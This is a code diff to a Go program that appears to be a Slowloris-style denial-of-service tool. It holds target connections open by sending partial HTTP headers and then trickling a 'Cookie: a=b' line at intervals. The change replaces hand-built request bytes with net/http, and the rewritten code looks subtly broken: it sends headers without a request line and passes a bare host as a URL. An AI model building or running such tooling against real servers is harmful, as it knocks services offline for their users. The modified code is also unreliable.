@@ -1,11 +1,10 @@
 package main
 
 import (
-	"bytes"
 	"flag"
 	"fmt"
-	"io"
 	"net"
+	"net/http"
 	"os"
 	"os/signal"
 	"strings"
@@ -92,18 +91,15 @@ loop:
 
 		host := target
 		headers := makeHeaders(host)
-		req := createRequest(host, method, resource, headers)
-
-		conn.SetWriteDeadline(time.Now().Add(timeoutDuration))
-		_, err = io.Copy(conn, req)
+		req, err := createRequest(host, method, resource, headers)
 		if err != nil {
 			continue
 		}
+		req.Header.Write(conn)
 
 		for {
 			select {
 			case <-time.After(time.Duration(interval) * time.Second):
-				conn.SetWriteDeadline(time.Now().Add(timeoutDuration))
 				_, err := conn.Write([]byte("Cookie: a=b\r\n"))
 				if err != nil {
 					continue loop
@@ -114,15 +110,17 @@ loop:
 
 }
 
-func createRequest(host, method, resource string, headers map[string]string) *bytes.Buffer {
-	buf := bytes.NewBuffer(make([]byte, 0))
-	buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, resource))
-
-	for header, value := range headers {
-		buf.WriteString(fmt.Sprintf("%s: %s\r\n", header, value))
+func createRequest(host, method, resource string, headers map[string]string) (*http.Request, error) {
+	req, err := http.NewRequest(method, host, nil)
+	if err != nil {
+		return nil, err
 	}
 
-	return buf
+	for header, value := range headers {
+		req.Header.Add(header, value)
+	}
+
+	return req, nil
 }
 
 func makeHeaders(host string) map[string]string {
